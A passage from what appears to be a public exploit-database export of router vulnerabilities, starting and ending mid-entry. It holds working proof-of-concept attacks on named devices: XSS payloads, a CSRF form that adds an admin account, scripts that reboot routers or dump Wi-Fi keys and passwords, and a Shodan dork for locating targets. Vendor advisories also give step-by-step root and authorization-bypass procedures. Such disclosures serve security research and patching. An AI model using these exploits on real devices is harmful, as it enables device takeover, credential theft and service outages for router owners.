# Discovery Date: 2018-09-16
# Vendor Homepage: http://www.netis-systems.com
# Software Link: http://www.netis-systems.com/Home/detail/id/74.html
# Tested Version: RTK 2.1.1
# Tested on OS: Kali Linux
# CVE: N/A
# Description:
# Improper input validation on the  router web interface allows attackers add a persistent
# Cross-Site scripting attack on the Dynamic DNS hostname field. Simply intercept a renaming
# request and add in the XSS
# Poc","POST /form2Ddns.cgi HTTP/1.1
Host: Target
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://Target/ddns.htm?v=1537192256000
Cookie: SessionID=
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 119
ddnsProv=0&hostname=<script>alert(""Cakes"");</script>&interface=15&enable=on&username=tester&password=tester&addacc=Add&submit.htm%3Fddns.htm=Send"
2018-09-05,WebApps,Hardware,Sandip Dey,Tenda ADSL Router D152,Cross-Site Scripting,"# Exploit Title: Tenda D152 ADSL Router - Cross-Site Scripting
# Exploit Author: Sandip Dey
# Date: 2018-07-21
# Vendor Homepage:  http://www.tendacn.com
# Hardware Link: https://www.amazon.in/Tenda-D152-ADSL2-Modem-Router/dp/B00IM8CWTE/ref=sr_1_fkmr0_1?ie=UTF8&qid=1536170904&sr=8-1-fkmr0&keywords=Tenda+D152+ADSL+router
# Category: Hardware
# Tested on: Windows 8.1
# CVE: CVE-2018-14497
# Reproduction Steps:","Goto your Wifi Router Gateway [i.e: http://Target]
Go to --> ""General Setup"" --> ""Wireless"" --> ""Basic Settings
Now change the SSID to <script>alert(""Sandip"")</script> and hit apply
Refresh the page, and you will get the ""Sandip"" pop-up"
2018-08-31,WebApps,Hardware,cakes,Vox TG790 ADSL Router,Cross-Site Scripting,"# Title: Vox TG790 ADSL Router - Cross-Site Scripting
# Author: Cakes
# Exploit Date: 2018-08-01
# Vendor: Vox Telecom
# Link: https://www.vox.co.za/
# Firmware Version: 6.2.W.1
# CVE: N/A
# Description
# Due to improper user iunput management low privilege users are able to create
# a persistent Cross-Site scripting attack via the phone book function.
# PoC
# Response","POST /cgi/b/_voip_/phonebook/?be=0&l0=2&l1=1&name= HTTP/1.1
Host: 192.168.1.254
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: https://192.168.1.254/cgi/b/_voip_/pb/?be=0&l0=2&l1=1&name=
Authorization: Digest username=""cakes"", realm=""SpeedTouch"", nonce=""0745EHNLF:00-1D-68-52-6C-37:173934:292999"", uri=""/cgi/b/_voip_/phonebook/?be=0&l0=2&l1=1&name="", response=""ab09b54d4b6369496463eb79cfb4b1c2"", qop=auth, nc=0000002a, cnonce=""8305e26a71dd0ae2""
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 141
0=10&1=&100=Cakes&101=Cakes&102=123123&103=123123123&104=123123&105=123123&106=<script>altert(""TESTER"");</script>
HTTP/1.0 200 OK
Cache-Control: no-cache
Expires: -1
Content-Type: text/html"
2018-08-24,WebApps,Hardware,cakes,Vox TG790 ADSL Router,Cross-Site Request Forgery (Add Admin),"# Title: Vox TG790 ADSL Router - Cross-Site Request Forgery (Add Admin)
# Author: Cakes
# Exploit Date: 2018-08-01
# Vendor: Vox Telecom
# Link: https://www.vox.co.za/
# Firmware Version: 6.2.W.1
# CVE: N/A
# Description
# Due to improper session management low privilege users are able to create
# administrator accounts through a crafted POST request.
# PoC","<html>
<form action=""https://TARGET/cgi/b/users/cfg/usraccedit/?be=0&l0=2&l1=9&tid=ADD_USER"" method=""POST"">
<input type=""hidden"" name=""0"" id=""0"" value=""10"">
<input type=""hidden"" name=""1"" id=""1"" value=""usrAccApply"">
<input type=""hidden"" name=""34"" id=""34"" value=""LulzCakes"">
<input type=""hidden"" name=""36"" id=""36"" value=""1"">
<input type=""text"" name=""33"" id=""33"" placeholder=""Account Name"">
<br />
<input type=""text"" name=""31"" id=""31"" value=""Administrator"">
<br />
<input type=""submit"" value=""W00ts"">
</form>
</html>"
2018-08-13,DoS,Hardware,Chris Rose,PLC Wireless Router GPN2.4P21-C-CN,Denial of Service,"# Exploit Title: PLC Wireless Router GPN2.4P21-C-CN Unauthenticated Remote Reboot
# Date: 8/12/2018
# Exploit Author: Chris Rose
# Affected Model : GPN2.4P21-C-CN(Firmware: W2001EN-00)
# Vendor: ChinaMobile
# Tested on: Debian Linux
# Shodan dork- title:PLC
# CVE: None
#Description: PLC Wireless Router's are vulnerable to a unauthenticated remote reboot
# which can be achieved through sending a modified http request. The script below will
# take a user suppled IP address of a PLC router and send the exploit to the device.# Use the Shodan dork above to find PLC wireless routers.","import requests
import time
target = raw_input(""Enter target IP: "")
post_data = {'reboot' : 'Reboot', 'obj-action' : 'reboot', 'var%3Anoredirect' : '1', 'var%3Amenu' : 'maintenance', 'var%3Apage' : 'system', 'var%3Aerrorpage' : 'system', 'getpage' : 'html%2Fpage%2Frestarting.html'}
exploit = requests.post(""http://""+target+"":8080/cgi-bin/webproc"", data=post_data)
print (""Sent exploit attempt to %s"")% target
time.sleep(1.2)
print (""Test if device is offline."")
time.sleep(1.5)
print (""Visit http://""+target+"":8080/"")"
2018-08-09,WebApps,Hardware,Wadeek,TP-Link C50 Wireless Router 3,Cross-Site Request Forgery (Information Disclosure),"# Exploit Title: TP-Link C50 Wireless Router 3 - Cross-Site Request Forgery (Information Disclosure)
# Date: 2018-08-09
# Exploit Author: Wadeek
# Vendor Homepage: https://www.tp-link.com/
# Hardware Version: Archer C50 v3 00000001
# Firmware Link: https://www.tp-link.com/download/Archer-C50_V3.html#Firmware
# Firmware Version: <= Build 171227
# Get Wireless Settings
# Get DDNS Settings","url = ""http://192.168.0.1:80/""
require('mechanize')
agent = Mechanize.new()
def dump(agent, url, path, query)
begin
response = agent.post(url+path, query, {
""User-Agent"" => """",
""Accept"" => ""*/*"",
""Referer"" => ""http://192.168.0.1/mainFrame.htm"",
""Content-Type"" => ""text/plain"",
""Connection"" => ""keep-alive"",
""Cookie"" => """"
rescue Exception => e
begin
puts(e.inspect())
puts(e.page().body())
rescue
end
puts("""")
else
puts(path)
puts(response.body())
puts("""")
end
end
dump(agent, url, ""cgi?5"", ""[LAN_WLAN#0,0,0,0,0,0#0,0,0,0,0,0]0,10\r\nname\r\nenable\r\nstandard\r\nSSID\r\nregulatoryDomain\r\npossibleChannels\r\nautoChannelEnable\r\nchannel\r\nX_TP_PreSharedKey\r\nX_TP_Band\r\n"")
dump(agent, url, ""cgi?1&1&1"", ""[DYN_DNS_CFG#0,0,0,0,0,0#0,0,0,0,0,0]0,0\r\n[NOIP_DNS_CFG#0,0,0,0,0,0#0,0,0,0,0,0]1,0\r\n[CMX_DNS_CFG#0,0,0,0,0,0#0,0,0,0,0,0]2,0\r\n"")"
2018-08-09,WebApps,Hardware,Wadeek,TP-Link C50 Wireless Router 3,Cross-Site Request Forgery (Remote Reboot),"# Exploit Title: TP-Link C50 Wireless Router 3 - Cross-Site Request Forgery (Remote Reboot)
# Date: 2018-08-09
# Exploit Author: Wadeek
# Vendor Homepage: https://www.tp-link.com/
# Hardware Version: Archer C50 v3 00000001
# Firmware Link: https://www.tp-link.com/download/Archer-C50_V3.html#Firmware
# Firmware Version: <= Build 171227","url = ""http://192.168.0.1:80/""
require('mechanize')
agent = Mechanize.new()
def reboot(agent, url, path, query)
begin
response = agent.post(url+path, query, {
""User-Agent"" => """",
""Accept"" => ""*/*"",
""Referer"" => ""http://192.168.0.1/mainFrame.htm"",
""Content-Type"" => ""text/plain"",
""Connection"" => ""keep-alive"",
""Cookie"" => """"
rescue Exception => e
begin
puts(e.inspect())
puts(e.page().body())
rescue
end
puts("""")
else
puts(path)
puts(response.body())
puts("""")
end
end
reboot(agent, url, ""cgi?7"", ""[ACT_REBOOT#0,0,0,0,0,0#0,0,0,0,0,0]0,0\r\n"")"
2018-08-08,DoS,Hardware,Aniket Dinda,TP-Link Wireless N Router WR840N,Denial of Service (PoC),"# Exploit Title:- TP-Link Wireless N Router WR840N - Denial of Service (PoC)
# Date: 2018-08-05
# Vendor Homepage: https://www.tp-link.com/
# Hardware Link:  https://www.amazon.in/TP-LINK-TL-WR840N-300Mbps-Wireless-External/dp/B01A0G1J7Q
# Version: TP-Link Wireless N Router WR840N
# Category: Hardware
# Exploit Author:  Aniket Dinda
# Tested on: Windows 10
# Web: https://hackingvila.wordpress.com
# CVE: N/A
# Proof Of Concept:","1- First connect to this network.
2- Open BurpSuite and then start the intercept, making the necessary proxy changes to the internet browser.
3- Go to Quick setup.
4- Now as the Burp is intercept is on, you will find an Authorization: Basic followed by a string.
5- Now we paste a string consisting of 2000 zeros.
6- Then forward the connection.
7- Then your router automatically logout and net connection will be gone.
You have to reboot your router before it becomes available again."
2018-07-23,WebApps,Hardware,Nathu Nandwani,Tenda Wireless N150 Router 5.07.50,Cross-Site Request Forgery (Reboot Router),"# Exploit Title: Tenda Wireless N150 Router 5.07.50 - Cross-Site Request Forgery (Reboot Router)
# Date: 2018-07-21
# Exploit Author: Nathu Nandwani
# Website: http://nandtech.co
# CVE: CVE-2015-5996
# Description:
# The router is vulnerable to a cross-site request forgery attacker.
# If an administrator is currently logged in and visits a
# remote webpage containing forms existing in the router's firmware,
# a request can be forged to modify existing settings or even
# set the router to its default state.
# These are two examples that can work in the proof of concept:
# /goform/SysToolReboot - Reboot the router
# /goform/SysToolRestoreSet - Set the router to default settings
# Reference: https://www.kb.cert.org/vuls/id/630872","import socket
server_ip = ""0.0.0.0""
server_port = 80
router_ip = ""192.168.0.1""
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((server_ip, server_port))
sock.listen(1)
print ""Currently listening at "" + server_ip + "":"" + str(server_port)
client, (client_host, client_port) = sock.accept()
print ""Client connected: "" + client_host + "":"" + str(client_port)
print """"
print client.recv(1000)
client.send('HTTP/1.0 200 OK\r\n')
client.send('Content-Type: text/html\r\n')
client.send('\r\n')
client.send(""""""
<html>
<body>
<form method=""post"" id=""frmSetup"" name=""frmSetup"" action=""http://"""""" + router_ip + """"""/goform/SysToolReboot"">
<input name=""CMD"" value=""SYS_CONF"" type=""hidden"">
<input name=""GO"" value=""system_reboot.asp"" type=""hidden"">
<input name=""CCMD"" value=""0"" type=""hidden"">
</form>
<script>
document.getElementById(""frmSetup"").submit();
</script>
</body>
</html>
client.close()
sock.close()"
2018-07-23,WebApps,Hardware,Ankit Anubhav,Davolink DVW 3200 Router,Password Disclosure,"# Exploit Title: Davolink DVW 3200 Router - Password Disclosure
# Google Dork: N/A
# Zoomeye dork : https://www.zoomeye.org/searchResult?q=%22var%20user_passwd%22%20%2Bapp%3A%22DAVOLINK%20GAPD-7000%20WAP%20httpd%22
# Date: 2018-07-13
# Exploit Author: Ankit Anubhav
# Vendor Homepage: www.davolink.co.kr
# Software Link: N/A
# Version: DVW 3200
# Tested on: Python 2.7 Windows 10
# CVE : N/A
# Many Davolink Davolink DV 3200 devices credentials can be disclosed using the following script.
# Author : Ankit Anubhav (ankitanubhav.com)  of NewSky Security ( https://www.newskysecurity.com/ )
# Usage script.py 1.3.3.7 where 1.3.3.7 is the Davolink DV 3200 IP.
# Use responsibly only for research and testing purposes.
# Tested with python 2.7","import sys
import urllib2
import re
import base64
def davolink_credfinder(ip):
try:
req = urllib2.Request('http://' + ip + ':' + '88', headers={ 'User-Agent': 'Mozilla/5.0' })
connection_check = str(urllib2.urlopen(req).getcode())
if (connection_check == ""200""):
html = urllib2.urlopen(req).read()
str_html = str(html)
m=re.compile('var user\_passwd\=\""(.*?)\""').search(str_html)
encoded_pwd =str(m.group(1))
actual_pwd = base64.b64decode(encoded_pwd)
print ""**************************************************************************************************""
print ""The password for the Davolink device is "" + actual_pwd
print ""**************************************************************************************************""
else:
print ""Connection to port 88 was not successful. Cant find credentials,sorry.""
except:
print ""There was an error in connecting to the IP.""
davolink_credfinder(sys.argv[1])"
2018-07-05,Local,Hardware,SEC Consult,ADB Broadband Gateways / Routers,Privilege Escalation,"https://www.sec-consult.com
Source: https://www.adbglobal.com/about-adb/
Source: https://en.wikipedia.org/wiki/Advanced_Digital_Broadcast
http://$IP/ui/dboard/storage/storageusers?backto=storage
https://www.sec-consult.com/en/vulnerability-lab/advisories/index.html","SEC Consult Vulnerability Lab Security Advisory < 20180704-2 >
title: Privilege escalation via linux group manipulation
product: All ADB Broadband Gateways / Routers
(based on Epicentro platform)
vulnerable version: Hardware: ADB P.RG AV4202N, DV2210, VV2220, VV5522, etc.
fixed version: see ""Solution"" section below
CVE number: CVE-2018-13110
impact: critical
homepage: http://www.adbglobal.com
found: 2016-07-11
by: Stefan ViehbÃ¶ck (Office Vienna)
Johannes Greil (Office Vienna)
SEC Consult Vulnerability Lab
An integrated part of SEC Consult
Europe | Asia | North America
Vendor description:
""ADB creates and delivers the right solutions that enable our customers to
reduce integration and service delivery challenges to increase ARPU and reduce
churn. We combine ADB know-how and products with those from a number of third
party industry leaders to deliver complete solutions that benefit from
collaborative thinking and best in class technologies.""
""Founded in 1995, ADB initially focused on developing and marketing software
for digital TV processors and expanded its business to the design and
manufacture of digital TV equipment in 1997. The company sold its first set-top
box in 1997 and since then has been delivering a number of set-top boxes, and
Gateway devices, together with advanced software platforms. ADB has sold over
60 million devices worldwide to cable, satellite, IPTV and broadband operators.
ADB employs over 500 people, of which 70% are in engineering functions.""
Business recommendation:
By exploiting the group manipulation vulnerability on affected and unpatched
devices an attacker is able to gain access to the command line interface (CLI)
if previously disabled by the ISP.
Depending on the feature-set of the CLI (ISP dependent) it is then possible to
gain access to the whole configuration and manipulate settings in the web GUI
and escalate privileges to highest access rights.
It is highly recommended by SEC Consult to perform a thorough security review
by security professionals for this platform. It is assumed that further critical
vulnerabilities exist within the firmware of this device.
Vulnerability overview/description:
1) Privilege escalation via linux group manipulation (CVE-2018-13110)
An attacker with standard / low access rights within the web GUI is able to
gain access to the CLI (if it has been previously disabled by the configuration)
and escalate his privileges.
Depending on the CLI features it is possible to extract the whole configuration
and manipulate settings or gain access to debug features of the device, e.g.
via ""debug"", ""upgrade"", ""upload"" etc. commands in the CLI.
Attackers can gain access to sensitive configuration data such as VoIP
credentials or other information and manipulate any settings of the device.
Proof of concept:
1) Privilege escalation via linux group manipulation (CVE-2018-13110)
It is possible to manipulate the group name setting of ""Storage users"" and
overwrite the local linux groups called ""remoteaccess"" or ""localaccess"" in
(in /etc/group) which define access to Telnet or SSH on the ADB devices.
It may be possible to overwrite the ""root"" group as well but it may brick the
device and the default user is already within the ""root"" group. Hence this
attack has not been further tested.
The following steps describe the attack:
a) Add a new group called ""localaccess"" via the web GUI here:
This will generate the following new group in /etc/group. The original
""localaccess"" group will overwritten.
localaccess:Storage Group:5001:
b) Then delete this group via the web GUI again, the entry will be removed
from /etc/group completely.
c) Afterwards, create the following new group name entry via the web GUI and
add your user account (e.g. admin) which should have access to Telnet/SSH
now:
localaccess:x:20:root,admin,
d) Now the admin user has been added to the ""localaccess"" group and the ""admin""
account is allowed to login via SSH or Telnet. Excerpt of new /etc/group:
localaccess:x:20:root,admin,:Storage Group:5001:
Further attacks on the CLI interface will not be described in detail within
this advisory. It is possible to add new user accounts with highest access rights
(""newuser"" command) or upload the whole configuration to a remote FTP server
(""upload"" command). The available feature-set of the CLI depends on the firmware
version.
The XML configuration is encrypted, but can be easily decrypted with access to the
firmware. Then it can be manipulated and uploaded to the device again (""upgrade""
command) which allows privilege escalation by changing permissions or roles
within this file.
Vulnerable / tested versions:
The following specific devices & firmware have been tested which were the most
recent versions at the time of discovery:
The firmware versions depend on the ISP / customer of ADB and may vary!
ADB P.RG AV4202N - E_3.3.0, firmware version depending on ISP
ADB DV 2210 - E_5.3.0, firmware version depending on ISP
ADB VV 5522 - E_8.3.0, firmware version depending on ISP
ADB VV 2220 - E_9.0.6, firmware version depending on ISP
etc.
It has been confirmed by ADB that _all_ their ADB modems / gateways / routers
based on the Epicentro platform are affected by this vulnerability in all
firmware versions for all their customers (ISPs) at the time of identification
of the vulnerability _except_ those devices which have a custom UI developed
for the ISP.
Vendor contact timeline:
2016-07-12: Contacting vendor ADB, sending encrypted advisory, asking about
affected devices
2016-07 - 2017-04: Further coordination, waiting for firmware release,
implementation & rollout phases for their customers
2018-07-04: Embargo lifted, public release of security advisory
Solution:
The firmware versions depend on the ISP / customer of ADB and may vary!
Patch version:
ADB P.RG AV4202N >= E_3.3.2, firmware version depending on ISP
ADB DV2210 >= E_5.3.2, firmware version depending on ISP
ADB VV5522 >= E_8.3.2, firmware version depending on ISP
ADB VV2220 >= E_9.3.2, firmware version depending on ISP
etc.
Workaround:
Restrict access to the web interface and only allow trusted users.
Change any default/weak passwords to strong credentials.
Don't allow remote access to the web GUI via Internet.
Advisory URL:
SEC Consult Vulnerability Lab
SEC Consult
Europe | Asia | North America
About SEC Consult Vulnerability Lab
The SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It
ensures the continued knowledge gain of SEC Consult in the field of network
and application security to stay ahead of the attacker. The SEC Consult
Vulnerability Lab supports high-quality penetration testing and the evaluation
of new offensive and defensive technologies for our customers. Hence our
customers obtain the most current information about vulnerabilities and valid
recommendation about the risk profile of new technologies.
Interested to work with the experts of SEC Consult?
Send us your application https://www.sec-consult.com/en/career/index.html
Interested in improving your cyber security with the experts of SEC Consult?
Contact our local offices https://www.sec-consult.com/en/contact/index.html
Mail: research at sec-consult dot com
Web: https://www.sec-consult.com
Blog: http://blog.sec-consult.com
Twitter: https://twitter.com/sec_consult
EOF J. Greil / @2018"
2018-07-05,Local,Hardware,SEC Consult,ADB Broadband Gateways / Routers,Local Root Jailbreak,"https://www.sec-consult.com
Source: https://www.adbglobal.com/about-adb/
Source: https://en.wikipedia.org/wiki/Advanced_Digital_Broadcast
https://www.sec-consult.com/en/vulnerability-lab/advisories/index.html","SEC Consult Vulnerability Lab Security Advisory < 20180704-0 >
title: Local root jailbreak via network file sharing flaw
product: All ADB Broadband Gateways / Routers
(based on Epicentro platform)
vulnerable version: Hardware: ADB P.RG AV4202N, DV2210, VV2220, VV5522, etc.
fixed version: see ""Solution"" section below
CVE number: CVE-2018-13108
impact: critical
homepage: http://www.adbglobal.com
found: 2016-06-09
by: Johannes Greil (Office Vienna)
SEC Consult Vulnerability Lab
An integrated part of SEC Consult
Europe | Asia | North America
Vendor description:
""ADB creates and delivers the right solutions that enable our customers to
reduce integration and service delivery challenges to increase ARPU and reduce
churn. We combine ADB know-how and products with those from a number of third
party industry leaders to deliver complete solutions that benefit from
collaborative thinking and best in class technologies.""
""Founded in 1995, ADB initially focused on developing and marketing software
for digital TV processors and expanded its business to the design and
manufacture of digital TV equipment in 1997. The company sold its first set-top
box in 1997 and since then has been delivering a number of set-top boxes, and
Gateway devices, together with advanced software platforms. ADB has sold over
60 million devices worldwide to cable, satellite, IPTV and broadband operators.
ADB employs over 500 people, of which 70% are in engineering functions.""
Business recommendation:
By exploiting the local root vulnerability on affected and unpatched devices
an attacker is able to gain full access to the device with highest privileges.
Attackers are able to modify any settings that might have otherwise been
prohibited by the ISP. It is possible to retrieve all stored user credentials
(such as VoIP) or SSL private keys. Furthermore, attacks on the internal network
side of the ISP are possible by using the device as a jump host, depending on
the internal network security measures.
Network security should not depend on the security of independent devices,
such as modems. An attacker with root access to such a device can enable
attacks on connected networks, such as administrative networks managed by the
ISP or other users.
It is highly recommended by SEC Consult to perform a thorough security review
by security professionals for this platform. It is assumed that further critical
vulnerabilities exist within the firmware of this device.
Vulnerability overview/description:
1) Local root jailbreak via network file sharing flaw (CVE-2018-13108)
Most ADB devices offer USB ports in order for customers to use them for
printer or file sharing. In the past, ADB devices have suffered from symlink
attacks e.g. via FTP server functionality which has been fixed in more recent
firmware versions.
The ""Network File Sharing"" feature of current ADB devices via USB uses a samba
daemon which accesses the USB drive with highest access rights and exports the
network shares with root user permissions. The default and hardcoded setting
for the samba daemon within the smb.conf on the device has set ""wide links =
no"" which normally disallows gaining access to the root file system of the
device using symlink attacks via a USB drive.
But an attacker is able to exploit both a web GUI input validation and samba
configuration file parsing problem which makes it possible to access the root
file system of the device with root access rights via a manipulated USB drive.
The attacker can then edit various system files, e.g. passwd and session
information of the web server in order to escalate web GUI privileges and
start a telnet server and gain full system level shell access as root.
This is a local attack and not possible via remote access vectors as an
attacker needs to insert a specially crafted USB drive into the device!
Usually not even the ISPs themselves have direct root access on ADB devices
hence this attack is quite problematic for further internal attacks.
It is possible to change network routes and attack networks and systems within
the internal network of the ISP or add backdoors or sniffers to the device.
Furthermore, attackers are able to gain access to all stored credentials,
such as PPP, wireless, CPE management or VoIP passwords.
Proof of concept:
1) Local root jailbreak via network file sharing flaw (CVE-2018-13108)
The samba configuration file (smb.conf) of the ADB devices has set the
following default settings. All file system operations will be performed
by the root user as set in the ""force user"" / ""force group"" setting of the
exported share:
[global]
netbios name = HOSTNAME
workgroup = WORKGROUP
wide links = no
smb ports = 445 139
security = share
guest account = root
announce version = 5.0
socket options = TCP_NODELAY SO_RCVBUF=65536 SO_SNDBUF=65536
null passwords = yes
name resolve order = hosts wins bcast
wins support = yes
syslog only = yes
read only = no
hosts allow = 192.168.1.1/255.255.255.0
[share]
path = /mnt/sdb1/.
read only = false
force user = root
force group = root
guest ok = yes
An attacker can edit various values such as ""netbios name"" and ""workgroup"" via
the web GUI. The web GUI does some basic filtering and newlines are
unfortunately not allowed (the samba config file is line-based) hence a
special bypass has been crafted in order to change the default setting ""wide
links = no"" to ""wide links = yes"". This enables symlinks to the root file
system.
By using the following netbios name and workgroup, samba can be tricked into
allowing symlinks to the root file system of the device:
netbios domain / workgroup = =wide links = yes \ netbios name = wide links = yes
Relevant HTTP POST parameters:
&domainName==wide links = yes \ \ &hostName=wide+links+%3D+yes+%5C
According to the manpage of smb.conf, any line ending in a \ is continued by the
samba parser on the next line. Furthermore, it states that ""Only the first
equals sign in a parameter is significant."" - which it seems can be bypassed
by adding a backslash \. The parser now thinks that the ""wide links = yes"" has
been set and omits the hardcoded ""wide links = no"" which comes further down
below in the smb.conf file.
In order to add those special values within the web GUI a proxy server such as
burp proxy is needed because of basic input validation on the client side (not
server side).
The USB drive needs to be formatted to ext2 or ext3 which is supported by
the ADB device. Then create a symlink to the root file system via the
following command on the attacker's computer:
ln -s / /path/to/usbdevice/rootfs
After those settings have been changed and the USB drive has been set up,
the USB drive can be inserted into the ADB device. The USB volume needs to be
exported (with read/write permissions) as a share via the web GUI. Afterwards
it can be accessed over the network and the ""rootfs"" folder example from above
will give an attacker access to the ADB root file system with ""read & write""
access permissions as root.
Most file systems / partitions on the device are mounted read-only per default,
but the most important one ""/tmp"" contains all settings and is mounted writable
for operations.
The defaut user ""admin"" usually has little access rights during normal
operations which can be changed by manipulating the session file of the web
server within /tmp/ui_session_XXX where XXX is the session id of the currently
logged on user, e.g. change:
from: access.dboard/settings/management/telnetserver =|> 2001
to: access.dboard/settings/management/telnetserver =|> 2220
etc. (or change all entries for maximum access level)
This way, an attacker can give himself all/highest access permissions within
the GUI and change all the settings of the device! Hence the telnet or SSH
server can be started even though they might have been disabled by the ISP.
Furthermore, the /tmp/passwd file has to be changed in order to allow root
access via shell/telnet:
change: root:*:0:0:root:/root:/bin/ash
to: root::0:0:root:/root:/bin/ash
Now telnet into the device with root and no password.
Example of an ADB DV2210 device:
Trying $IP...
Connected to $IP.
Escape character is '^]'.
Login root:
BusyBox v1.17.3 (2016-02-11 13:34:33 CET) built-in shell (ash)
Enter 'help' for a list of built-in commands.
___ ___ ___ ___
|\__\ /\ \ /\ \ /\ |:| | /::\ \ /::\ \ /::\ |:| | /:/\:\ \ /:/\:\ \ /:/\:\ |:|__|__ /::\~\:\ \ /::\~\:\ \ _\:\~\:\ /::::\__\ /:/\:\ \:\__\ /:/\:\ \:\__\ /\ \:\ \:\__ /:/~~/~ \/__\:\/:/ / \/__\:\/:/ / \:\ \:\ \/__/
/:/ / \::/ / \::/ / \:\ \:\__ \/__/ /:/ / \/__/ \:\/:/ /
/:/ / \::/ /
\/__/ \/__/
yet another purposeful solution by A D B Broadband
root@$hostname:~# id
uid=0(root) gid=0(root) groups=0(root)
root@$hostname:~#
Vulnerable / tested versions:
The following devices & firmware have been tested which were the most recent
versions at the time of discovery.
The firmware versions depend on the ISP / customer of ADB and may vary!
ADB P.RG AV4202N - E_3.3.0, latest firmware version, depending on ISP
ADB DV 2210 - E_5.3.0, latest firmware version, depending on ISP
ADB VV 5522 - E_8.3.0, latest firmware version, depending on ISP
ADB VV 2220 - E_9.0.6, latest firmware version, depending on ISP
etc.
It has been confirmed by ADB that _all_ their ADB modems / gateways / routers
based on the Epicentro platform with USB ports and network file sharing
features are affected by this vulnerability in all firmware versions for all
their customers (ISPs) at the time of identification of the vulnerability.
Vendor contact timeline:
2016-06-15: Contacting vendor ADB, exchanging encryption keys & advisory
Asking about affected devices / firmware, timeline for hotfix
Fast initial response from ADB providing requested information
2016-06-16: Asking about other affected devices
2016-06-17: Resending previous question due to encryption problems
2016-07-04: Conference call
2016-07 - 2017-04: Further coordination, waiting for firmware release,
implementation & rollout phases for their customers
2018-07-04: Embargo lifted, public release of security advisory
Solution:
The firmware versions depend on the ISP / customer of ADB and may vary!
Patch version:
ADB P.RG AV4202N >= E_3.3.2, firmware version depending on ISP
ADB DV2210 >= E_5.3.2, firmware version depending on ISP
ADB VV5522 >= E_8.3.2, firmware version depending on ISP
ADB VV2220 >= E_9.3.2, firmware version depending on ISP
Centro Business 1 >= 7.12.10
Centro Business 2 >= 8.06.08
etc.
Workaround:
Restrict access to the web interface and only allow trusted users.
Change any default/weak passwords to strong credentials.
Don't allow remote access to the web GUI via Internet.
Advisory URL:
SEC Consult Vulnerability Lab
SEC Consult
Europe | Asia | North America
About SEC Consult Vulnerability Lab
The SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It
ensures the continued knowledge gain of SEC Consult in the field of network
and application security to stay ahead of the attacker. The SEC Consult
Vulnerability Lab supports high-quality penetration testing and the evaluation
of new offensive and defensive technologies for our customers. Hence our
customers obtain the most current information about vulnerabilities and valid
recommendation about the risk profile of new technologies.
Interested to work with the experts of SEC Consult?
Send us your application https://www.sec-consult.com/en/career/index.html
Interested in improving your cyber security with the experts of SEC Consult?
Contact our local offices https://www.sec-consult.com/en/contact/index.html
Mail: research at sec-consult dot com
Web: https://www.sec-consult.com
Blog: http://blog.sec-consult.com
Twitter: https://twitter.com/sec_consult
EOF J. Greil / @2018"
2018-07-05,WebApps,Hardware,SEC Consult,ADB Broadband Gateways / Routers,Authorization Bypass,"https://www.sec-consult.com
Source: https://www.adbglobal.com/about-adb/
Source: https://en.wikipedia.org/wiki/Advanced_Digital_Broadcast
http://$IP/ui/dboard/settings/management/telnetserver
http://$IP/ui/dboard/settings/management//telnetserver
http://$IP/ui/dboard/settings/proxy//rtsp
https://www.sec-consult.com/en/vulnerability-lab/advisories/index.html","SEC Consult Vulnerability Lab Security Advisory < 20180704-1 >
title: Authorization Bypass
product: All ADB Broadband Gateways / Routers
(based on Epicentro platform)
vulnerable version: Hardware: ADB P.RG AV4202N, DV2210, VV2220, VV5522, etc.
fixed version: see ""Solution"" section below
CVE number: CVE-2018-13109
impact: critical
homepage: http://www.adbglobal.com
found: 2016-06-28
by: Johannes Greil (Office Vienna)
SEC Consult Vulnerability Lab
An integrated part of SEC Consult
Europe | Asia | North America
Vendor description:
""ADB creates and delivers the right solutions that enable our customers to
reduce integration and service delivery challenges to increase ARPU and reduce
churn. We combine ADB know-how and products with those from a number of third
party industry leaders to deliver complete solutions that benefit from
collaborative thinking and best in class technologies.""
""Founded in 1995, ADB initially focused on developing and marketing software
for digital TV processors and expanded its business to the design and
manufacture of digital TV equipment in 1997. The company sold its first set-top
box in 1997 and since then has been delivering a number of set-top boxes, and
Gateway devices, together with advanced software platforms. ADB has sold over
60 million devices worldwide to cable, satellite, IPTV and broadband operators.
ADB employs over 500 people, of which 70% are in engineering functions.""
Business recommendation:
By exploiting the authorization bypass vulnerability on affected and unpatched
devices an attacker is able to gain access to settings that are otherwise
forbidden for the user, e.g. through strict settings set by the ISP. It is also
possible to manipulate settings to e.g. enable the telnet server for remote
access if it had been previously disabled by the ISP. The attacker needs some
user account, regardless of the permissions, for login, e.g. the default one
provided by the ISP or printed on the device can be used.
It is highly recommended by SEC Consult to perform a thorough security review
by security professionals for this platform. It is assumed that further critical
vulnerabilities exist within the firmware of this device.
Vulnerability overview/description:
1) Authorization bypass vulnerability (CVE-2018-13109)
Depending on the firmware version/feature-set of the ISP deploying the ADB
device, a standard user account may not have all settings enabled within
the web GUI.
An authenticated attacker is able to bypass those restrictions by adding a
second slash in front of the forbidden entry of the path in the URL.
It is possible to access forbidden entries within the first layer of the web
GUI, any further subsequent layers/paths (sub menus) were not possible to access
during testing but further exploitation can't be ruled out entirely.
Proof of concept:
1) Authorization bypass vulnerability (CVE-2018-13109)
Assume the following URL is blocked/forbidden within the web GUI settings:
Adding a second slash in front of the blocked entry ""telnetserver"" will enable
full access including write permissions to change settings:
This works for many other settings within the web GUI!
In our tests it was not possible to access subsequent layers, e.g.:
Assume that both the proxy menu and submenu ""rtsp"" settings are blocked,
a second slash will _not_ enable access to the RTSP settings:
Nevertheless, it can't be ruled out that sub menus can be accessed too when
further deeper tests are being performed.
Vulnerable / tested versions:
The following devices & firmware have been tested which were the most recent
versions at the time of discovery:
The firmware versions depend on the ISP / customer of ADB and may vary!
